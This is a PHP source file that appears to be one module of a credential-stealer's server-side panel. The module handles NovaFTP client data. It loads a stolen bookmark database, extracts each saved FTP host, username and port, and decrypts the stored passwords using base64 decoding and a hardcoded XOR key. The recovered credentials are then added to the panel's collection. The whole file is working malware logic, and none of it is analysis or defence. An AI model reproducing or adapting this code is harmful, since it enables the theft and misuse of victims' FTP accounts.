<?php
//ok
class Module_novaftp extends Module_
{
    private function Decrypt($Password)
    {
        $Password = trim($Password);
        if (!strlen($Password))
            return '';

        $Password = base64_decode($Password);
        if (!strlen($Password))
            return '';

        $KEY_ = 's235280i113755-381ds22';

        $Result = '';
        for ($i = 0; $i < strlen($Password); $i++)
            $Result .= chr(ord($Password[$i]) ^ ord($KEY_[$i % strlen($KEY_)]));

        return $Result;
    }

    private function ProcessNova($Data)
    {
		
        $FileDB = GetTempFile('nova');
        if(!file_put_contents($FileDB, $Data))
            return FALSE;

        $db = new SQLite3($FileDB);
        if(!$db)
            return FALSE;

        $Data = $db->query('SELECT host_name, user_name, user_pass, host_port  FROM bmk_ftp WHERE name != \'Microsoft\' AND name != \'Mozilla.org\' AND name != \'Adobe\'');

        while($Element = $Data->fetchArray())
        {
            $User = Assign_($Element['user_name']);
            $Pass = $this->Decrypt($Element['user_pass']);
            $Port = Assign_($Element['host_port']);
            $Host = Assign_($Element['host_name']);

            $this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
        }

        $db->close();
        @unlink($FileDB);
    }

    public function process_module($Data, $Version)
    {
		if(!class_exists("SQLite3"))
			return;
		
        switch ($Version)
        {
        case 0:
            $this->ProcessNova($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
